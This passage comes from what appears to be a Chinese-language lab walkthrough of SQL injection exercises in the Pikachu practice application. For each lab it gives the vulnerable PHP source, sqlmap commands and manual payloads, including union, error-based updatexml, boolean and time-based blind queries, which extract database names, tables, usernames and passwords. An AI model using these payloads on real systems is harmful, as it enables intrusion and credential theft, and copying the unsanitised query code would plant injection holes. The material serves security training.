class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2"</span> --batch//检测是否存在注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="手工注入-2"><a href="#手工注入-2" class="headerlink" title="手工注入"></a>手工注入</h4><p>只需要根据特定的语句做拼接闭合就好了，首先判断注入类型，%在sql语句中表示模糊匹配，由此判断是搜索型注入</p><p><img src="https://img1.imgtp.com/2022/04/08/624febb4e8c81.png"></p><p>找到注入点后就先尝试闭合，再插入其他sql语句，可以看到这里列举出了所有用户信息</p><p><img src="https://s2.loli.net/2022/04/08/HGay2PjqgXYkESt.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">name<span class="token operator">=</span><span class="token operator">%</span><span class="token string">'order by 3--+//判断字段数name=%'</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+//联合查询找到注入点</span>name<span class="token operator">=</span><span class="token operator">%</span><span class="token string">'union select 1,2,database()--+//查询数据库信息name=%'</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+//查询当前数据库表信息</span>name<span class="token operator">=</span><span class="token operator">%</span><span class="token string">'union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">')--+//查询当前表中的字段name=%'</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token comment">--+//查询账号密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/08/ZLmo34Mc1u8AFSg.png"></p><h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><h4 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//这里没有做任何处理，直接拼到select里面去了</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//这里的变量是字符型，需要考虑闭合</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select id,email from member where username=('<span class="token interpolation"><span class="token variable">$name</span></span>')"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到sql语句中，用<code>(&#39;&#39;)</code>把变量包裹</p><h4 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_x.php?name=lucy&amp;submit=%E6%9F%A5%E8%AF%A2"</span> --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="手工注入-3"><a href="#手工注入-3" class="headerlink" title="手工注入"></a>手工注入</h4><p>判断闭合条件</p><p><img src="https://s2.loli.net/2022/04/08/4xekQXAiNjlTHY2.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">name<span class="token operator">=</span><span class="token number">1</span><span class="token string">')--+//闭合name=1'</span><span class="token punctuation">)</span><span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment">--+//判断字段数</span>name<span class="token operator">=</span><span class="token number">1</span><span class="token string">')union select 1,2--+//显示回显点name=1'</span><span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+//查询当前数据库</span>name<span class="token operator">=</span><span class="token number">1</span><span class="token string">')union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+//查询当前库表的信息name=1'</span><span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token comment">--+//查询当前字段信息</span>name<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token comment">--+//查询账号密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/08/xCKsVQGBhIqbkf8.png"></p><h3 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h3><h4 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//没转义,导致注入漏洞,操作类型为insert</span><span class="token variable">$getdata</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into member(username,pw,sex,phonenum,email,address) values('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>',md5('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>'),'<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sex'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phonenum'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>')"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token comment">//未转义,形成注入,sql操作类型为update</span><span class="token variable">$getdata</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"update member set sex='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sex'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>',phonenum='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phonenum'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>',address='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>',email='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$getdata</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>' where username='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sqli'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqlmap-4"><a href="#sqlmap-4" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>在注册页面或修改个人信息界面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">'http://localhost/pikachu/vul/sqli/sqli_iu/sqli_reg.php'</span> --batch --forms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="手工注入-4"><a href="#手工注入-4" class="headerlink" title="手工注入"></a>手工注入</h4><p>注册和修改个人信息界面都可以进行以下语句的sql注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' or updatexml(1,concat(0x7e,user()),0) or'</span><span class="token number">1</span><span class="token string">' or updatexml(1,concat(0x7e,database()),0) or'</span><span class="token string">' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)or'</span><span class="token comment">//查询当前数据库表</span><span class="token string">' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">')),1)or'</span><span class="token comment">//查询当前表字段名</span><span class="token string">' or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)or'</span><span class="token comment">//查询账号信息</span><span class="token string">' or updatexml(1,concat(0x7e,(select password from users limit 2,1)),1)or'</span><span class="token comment">//查询密码信息，因为字段过长需要用到limit来查询</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/09/smky1CWqwxuTijB.png"></p><p><img src="https://s2.loli.net/2022/04/09/mZe24WJPM7LUFoD.png"></p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><h4 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"delete from message where id=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="sqlmap-5"><a href="#sqlmap-5" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>删除按钮的链接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_del.php?id=209"</span> --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="手工注入-5"><a href="#手工注入-5" class="headerlink" title="手工注入"></a>手工注入</h4><p>在url中添加的信息需要进行<code>url encode</code>处理</p><p><img src="https://s2.loli.net/2022/04/09/GyvPp2s81ufz7JH.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span> <span class="token operator">or</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//查询数据库信息</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">or</span><span class="token operator">+</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">+</span><span class="token keyword">where</span><span class="token operator">+</span>table_schema<span class="token operator">%</span><span class="token number">3</span>ddatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//查询数据表信息</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">or</span><span class="token operator">+</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token operator">+</span><span class="token keyword">where</span><span class="token operator">+</span>table_schema<span class="token operator">%</span><span class="token number">3</span>ddatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">and</span><span class="token operator">+</span>table_name<span class="token operator">%</span><span class="token number">3</span>d<span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//查询字段名</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">or</span><span class="token operator">+</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//查询账号</span><span class="token number">1</span><span class="token operator">+</span><span class="token operator">or</span><span class="token operator">+</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span>password<span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>users<span class="token operator">+</span><span class="token keyword">limit</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//查询密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/09/WU93kzOKu2jEDP5.png"></p><h3 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h3><h4 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//直接获取前端过来的头信息,没人任何处理,留下安全隐患</span><span class="token variable">$remoteipadd</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$useragent</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$httpaccept</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_ACCEPT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$remoteport</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_PORT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('<span class="token interpolation"><span class="token variable">$is_login_id</span></span>','<span class="token interpolation"><span class="token variable">$remoteipadd</span></span>','<span class="token interpolation"><span class="token variable">$useragent</span></span>','<span class="token interpolation"><span class="token variable">$httpaccept</span></span>','<span class="token interpolation"><span class="token variable">$remoteport</span></span>')"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqlmap-6"><a href="#sqlmap-6" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>访问登录后的界面，抓包</p><p>在指定的参数后面加上 * 号，表示测试该参数</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">GET /pikachu/vul/sqli/sqli_header/sqli_header.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0*Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: closeCookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=40ljaddubp066oc4n0lc40b2fvUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r sqlmap.txt --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="手工注入-6"><a href="#手工注入-6" class="headerlink" title="手工注入"></a>手工注入</h4><p>注入点在<code>User-Agent</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' or updatexml(1,concat(0x7e,(select database())),1)or'</span><span class="token comment">//查看数据库信息</span><span class="token string">' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)or'</span><span class="token comment">//查询表名</span><span class="token string">' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">')),1)or'</span><span class="token comment">//查询当前表字段名</span><span class="token string">' or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)or'</span><span class="token comment">//查询账号信息</span><span class="token string">' or updatexml(1,concat(0x7e,(select password from users limit 2,1)),1)or'</span><span class="token comment">//查询密码信息，因为字段过长需要用到limit来查询</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/09/cyDLKZFsjfX6z9x.png"></p><h3 id="盲注-base-on-boolian"><a href="#盲注-base-on-boolian" class="headerlink" title="盲注(base on boolian)"></a>盲注(base on boolian)</h3><h4 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//这里没有做任何处理，直接拼到select里面去了</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select id,email from member where username='<span class="token interpolation"><span class="token variable">$name</span></span>'"</span><span class="token punctuation">;</span><span class="token comment">//这里的变量是字符型，需要考虑闭合</span><span class="token comment">//mysqi_query不打印错误描述,即使存在注入,也不好判断</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqlmap-7"><a href="#sqlmap-7" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"</span> --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="手工注入-7"><a href="#手工注入-7" class="headerlink" title="手工注入"></a>手工注入</h4><p>由于页面不返回错误信息，因此得用比较来判断字符</p><p>前面id等于的信息必须是存在的，这样才能正确执行后面拼接的语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">lucy<span class="token string">' --+//语句闭合lucy'</span> <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">7</span><span class="token comment">--+//判断数据库字符数</span>lucy<span class="token string">' and (substr(database(),2,1))='</span>i<span class="token string">'--+//判断数据库名lucy'</span> <span class="token operator">and</span> <span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'h'</span><span class="token comment">--+//判断表名</span>lucy<span class="token string">' and (substr((select column_name from information_schema.columns where table_schema=database() and table_name='</span>users<span class="token string">' limit 0,1),1,1))='</span>i<span class="token string">'--+//判断列名lucy'</span> <span class="token operator">and</span> <span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span><span class="token comment">--+//判断用户名数据</span>lucy<span class="token string">' and (substr((select password from users limit 0,1),1,1))='</span>e'<span class="token comment">--+//判断用户名数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以配合bp</p><p><img src="https://s2.loli.net/2022/04/09/i3TxpBuOK2PQymw.png"></p><p>以此类推，所有表名为httpinfo,member,message,users,xssblind，所有字段名为id,username,password,level,id,username,password</p><h3 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注(base on time)"></a>盲注(base on time)</h3><h4 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a><strong>源码</strong></h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//这里没有做任何处理，直接拼到select里面去了</span>   <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select id,email from member where username='<span class="token interpolation"><span class="token variable">$name</span></span>'"</span><span class="token punctuation">;</span><span class="token comment">//这里的变量是字符型，需要考虑闭合</span>   <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysqi_query不打印错误描述</span><span class="token comment">//     $result=execute($link, $query);</span><span class="token comment">//    $html.="&lt;p class='notice'>i don't care who you are!&lt;/p>";</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token variable">$email</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token comment">//这里不管输入啥,返回的都是一样的信息,所以更加不好判断</span>           <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p class='notice'>i don't care who you are!&lt;/p>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="sqlmap-8"><a href="#sqlmap-8" class="headerlink" title="sqlmap"></a>sqlmap</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://localhost/pikachu/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"</span> --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="手工注入-8"><a href="#手工注入-8" class="headerlink" title="手工注入"></a>手工注入</h4><p>由于没有任何有效的回显信息，因此只能通过<code>sleep</code>函数来判断</p><p>网页延迟了5s</p><p>前面id等于的信息必须是存在的，这样才能正确执行后面拼接的语句</p><p><img src="https://s2.loli.net/2022/04/09/EO9KfyFAGe6xRTD.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">lucy<span class="token string">' and sleep(5)--+//闭合函数执行#当判断成功时页面会延时lucy'</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token 